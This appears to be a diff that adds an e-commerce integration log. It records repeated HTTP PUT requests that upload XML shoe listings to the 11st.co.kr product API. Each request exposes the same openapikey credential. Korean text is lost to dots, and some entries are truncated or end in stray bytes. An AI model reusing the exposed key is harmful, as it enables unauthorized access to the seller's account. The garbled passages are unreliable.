@@ -1,0 +1,2168 @@
+-------LOG_admin_20181119095259_ok.csv-------
+PUT /rest/prodservices/product/2019750623 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 24742
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020749]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[SoftScience  Mens Fin 2.0 Water Shoes/950008978 .... ........../......../..........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[SoftScience]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950008978]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/SoftScience/950008978/600_600_17DJMUFN20BRWNXXXFOT_Black.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/SoftScience/950008978/600_600_17DJMUFN20BRWNXXXFOT_Black.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/SoftScience/950008978/600_600_17DJMUFN20BRWNXXXFOT_Black.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/SoftScience/950008978/600_600_17DJMUFN20BRWNXXXFOT_Black.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">SoftScience Mens Fin 2.0 Water Shoes</div><div style="text-align:left;">PROD950008978</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>With sunny skies and calm winds in the forecast, plan for a relaxing day on the water in the SoftScience&reg; Men''s Fin 2.0 water shoes. These roomy, relaxed boat shoes features an all-synthetic mesh upper with drainage ports for quick-drying performance. The removable, washable Trileon&trade; insole lends cushioning, while the non-marking outsole delivers sure footing on slippery surfaces. FEATURES:<br>Breathable woven microfiber upper<br>Forefoot drainage system disperses water and dries shoe quickly<br>Synthetic laces stay secure for a lasting, reliable fit<br>Removable and washable Trileon&trade; insole lends cushioning<br>Trileon&trade;outsole helps you keep your footing<br>Universal Comfort Platform supplies a relaxed, roomy fit for lasting comfort<br>Non-marking, slip-resistant outsole provides trustworthy traction on wet and dry surfaces Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: SoftScience<br>Country of Origin: Imported<br>Style: MC0049 <br>Web ID: 17DJMUFN20BRWNXXXFOT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.17 00:48:51</dip?~^?
+------end--------
+
+-------LOG_admin_20181119095259_ok.csv-------
+PUT /rest/prodservices/product/2019750623 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 24742
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020749]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[SoftScience  Mens Fin 2.0 Water Shoes/950008978 .... ........../......../..........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[SoftScience]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950008978]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/SoftScience/950008978/600_600_17DJMUFN20BRWNXXXFOT_Black.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/SoftScience/950008978/600_600_17DJMUFN20BRWNXXXFOT_Black.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/SoftScience/950008978/600_600_17DJMUFN20BRWNXXXFOT_Black.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/SoftScience/950008978/600_600_17DJMUFN20BRWNXXXFOT_Black.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">SoftScience Mens Fin 2.0 Water Shoes</div><div style="text-align:left;">PROD950008978</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>With sunny skies and calm winds in the forecast, plan for a relaxing day on the water in the SoftScience&reg; Men''s Fin 2.0 water shoes. These roomy, relaxed boat shoes features an all-synthetic mesh upper with drainage ports for quick-drying performance. The removable, washable Trileon&trade; insole lends cushioning, while the non-marking outsole delivers sure footing on slippery surfaces. FEATURES:<br>Breathable woven microfiber upper<br>Forefoot drainage system disperses water and dries shoe quickly<br>Synthetic laces stay secure for a lasting, reliable fit<br>Removable and washable Trileon&trade; insole lends cushioning<br>Trileon&trade;outsole helps you keep your footing<br>Universal Comfort Platform supplies a relaxed, roomy fit for lasting comfort<br>Non-marking, slip-resistant outsole provides trustworthy traction on wet and dry surfaces Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: SoftScience<br>Country of Origin: Imported<br>Style: MC0049 <br>Web ID: 17DJMUFN20BRWNXXXFOT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.17 00:48:51</di
+------end--------
+
+-------LOG_admin_20181119095259_ok.csv-------
+PUT /rest/prodservices/product/2222573577 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11017
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Nike  Mens Force Zoom Trout 5 Turf Baseball Cleats/950010577 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Nike]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950010577]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Nike/950010577/600_600_18NIKMFRCZMTRT5TFCCH_Silver_Red.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Nike/950010577/600_600_18NIKMFRCZMTRT5TFCCH_Silver_Red.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Nike/950010577/600_600_18NIKMFRCZMTRT5TFCCH_Silver_Red.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Nike/950010577/600_600_18NIKMFRCZMTRT5TFCCH_Silver_Red.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Force Zoom Trout 5 Turf Baseball Cleats</div><div style="text-align:left;">PROD950010577</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Prepare yourself to dominate the new season in the Force Zoom Trout V. A molded mesh and synthetic upper offers you a snug supportive fit with optimum breathability for added comfort. The Nike&reg; Force Zoom Trout 5 turf baseball cleat has a Zoom Air unit that absorbs impact for enhanced comfort and support. The rubber nubbed outsole provides maximum traction and stability on a variety of surfaces. FEATURES:<br>Color and graphics are inspired by the MLB All-Star Game <br>Molded mesh and synthetic skin upper for stability, durability and enhanced breathability <br>Neoprene tongue provides comfort and easy on and off <br>Zoom Air units help absorb impact <br>Translucent rubber outsole offers durable tractionProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Style: AH3383 <br>Web ID: 18NIKMFRCZMTRT5TFCCH function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.16 11:34:55</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid #888888;margin-top:10px;margin-bottom:1px;"><div class="divColorName" style="bordpA~^?
+------end--------
+
+-------LOG_admin_20181119095259_ok.csv-------
+PUT /rest/prodservices/product/2222573577 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11017
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Nike  Mens Force Zoom Trout 5 Turf Baseball Cleats/950010577 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Nike]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950010577]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Nike/950010577/600_600_18NIKMFRCZMTRT5TFCCH_Silver_Red.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Nike/950010577/600_600_18NIKMFRCZMTRT5TFCCH_Silver_Red.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Nike/950010577/600_600_18NIKMFRCZMTRT5TFCCH_Silver_Red.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Nike/950010577/600_600_18NIKMFRCZMTRT5TFCCH_Silver_Red.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Force Zoom Trout 5 Turf Baseball Cleats</div><div style="text-align:left;">PROD950010577</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Prepare yourself to dominate the new season in the Force Zoom Trout V. A molded mesh and synthetic upper offers you a snug supportive fit with optimum breathability for added comfort. The Nike&reg; Force Zoom Trout 5 turf baseball cleat has a Zoom Air unit that absorbs impact for enhanced comfort and support. The rubber nubbed outsole provides maximum traction and stability on a variety of surfaces. FEATURES:<br>Color and graphics are inspired by the MLB All-Star Game <br>Molded mesh and synthetic skin upper for stability, durability and enhanced breathability <br>Neoprene tongue provides comfort and easy on and off <br>Zoom Air units help absorb impact <br>Translucent rubber outsole offers durable tractionProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Style: AH3383 <br>Web ID: 18NIKMFRCZMTRT5TFCCH function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.16 11:34:55</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid #888888;margin-top:10px;margin-bottom:1px;"><div class="divColorName" style="bord
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2179189593 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 14065
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.......... Diamond Nike Mens Air  Baseball Turf Shoes/950000497 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Diamond]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950000497]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Diamond/950000497/600_600_16NIKMRDMNDTRNRXXCCH_Black_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Diamond/950000497/600_600_16NIKMRDMNDTRNRXXCCH_Black_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Diamond/950000497/600_600_16NIKMRDMNDTRNRXXCCH_Black_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Diamond/950000497/600_600_16NIKMRDMNDTRNRXXCCH_Black_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Air Diamond Baseball Turf Shoes</div><div style="text-align:left;">PROD950000497</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>When searching for a shoe designed with today..s athlete in mind look no further than the Air Diamond Trainer. A synthetic leather upper with removable tongue flap ensures superior fit and comfort. The Nike&reg; Air Diamond Trainer baseball turf shoe features a full-length phylon midsole with heeL .AIR-sole unit that delivers a low-profile feel and maximum cushioning while a rubber combination outsole provides the traction MLB players rely on. FEATURES:<br>Lightweight synthetic leather combination upper with removable tongue flap delivers comfort and fit <br>Full-length Phylon midsole with heeL .AIR-Sole unit for a comfortable ride and low to the ground feel <br>Rubber outsole combining nubby bottom with cross-training traction to meet the on-field needs of players <br>Weight: 13.4 ozProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Country of Origin: Imported<br>Style: 333785 <br>Web ID: 16NIKMRDMNDTRNRXXCCH function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 18:18:32</div><div style="text-align:center;"><div style=""><div class="divCp?}??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2179189593 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 14065
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.......... Diamond Nike Mens Air  Baseball Turf Shoes/950000497 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Diamond]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950000497]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Diamond/950000497/600_600_16NIKMRDMNDTRNRXXCCH_Black_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Diamond/950000497/600_600_16NIKMRDMNDTRNRXXCCH_Black_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Diamond/950000497/600_600_16NIKMRDMNDTRNRXXCCH_Black_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Diamond/950000497/600_600_16NIKMRDMNDTRNRXXCCH_Black_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Air Diamond Baseball Turf Shoes</div><div style="text-align:left;">PROD950000497</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>When searching for a shoe designed with today..s athlete in mind look no further than the Air Diamond Trainer. A synthetic leather upper with removable tongue flap ensures superior fit and comfort. The Nike&reg; Air Diamond Trainer baseball turf shoe features a full-length phylon midsole with heeL .AIR-sole unit that delivers a low-profile feel and maximum cushioning while a rubber combination outsole provides the traction MLB players rely on. FEATURES:<br>Lightweight synthetic leather combination upper with removable tongue flap delivers comfort and fit <br>Full-length Phylon midsole with heeL .AIR-Sole unit for a comfortable ride and low to the ground feel <br>Rubber outsole combining nubby bottom with cross-training traction to meet the on-field needs of players <br>Weight: 13.4 ozProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Country of Origin: Imported<br>Style: 333785 <br>Web ID: 16NIKMRDMNDTRNRXXCCH function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 18:18:32</div><div style="text-align:center;"><div style=""><div class="divC
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2142971920 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 23355
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[........ New Balance  Mens MU950 V2 Mid Umpire Shoes/950000432 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[New Balance]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950000432]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/NewBalance/950000432/600_600_15NWBMMDBLCKBLCKMCCH_Black.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/NewBalance/950000432/600_600_15NWBMMDBLCKBLCKMCCH_Black.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/NewBalance/950000432/600_600_15NWBMMDBLCKBLCKMCCH_Black.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/NewBalance/950000432/600_600_15NWBMMDBLCKBLCKMCCH_Black.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">New Balance Mens MU950 V2 Mid Umpire Shoes</div><div style="text-align:left;">PROD950000432</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Get the same performance and comfort the professionals do in the MU950 V2. A synthetic leather and mesh upper delivers a comfortable molded to your foot fit and unmatched breathability for game long comfort you can count on. The New Balance&reg; MU950 V2 umpire shoe has full-length REVlite RC midsole that offers superior padding and comfort without added weight while a lightweight rubber outsole provides maximum traction and support. FEATURES:<br>Full-length REVlite RC midsole is a higher density midsole that weighs much less than traditional midsoles, the REVlite RC also has shank that offers torsional rigidity<br>Rubber outsole ensures lightweight traction, support and stability that allows you to focus all of you attention on the game <br>Official footwear of on-field Major League Baseball Umpires <br>Weight 10.9 ozProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: New Balance<br>Country of Origin: Imported<br>Style: MU950 <br>Web ID: 15NWBMMDBLCKBLCKMCCH function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 18:21:35</div><div style="text-align:centerpA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2142971920 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 23355
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[........ New Balance  Mens MU950 V2 Mid Umpire Shoes/950000432 .... ....../......]]></prdNm> 
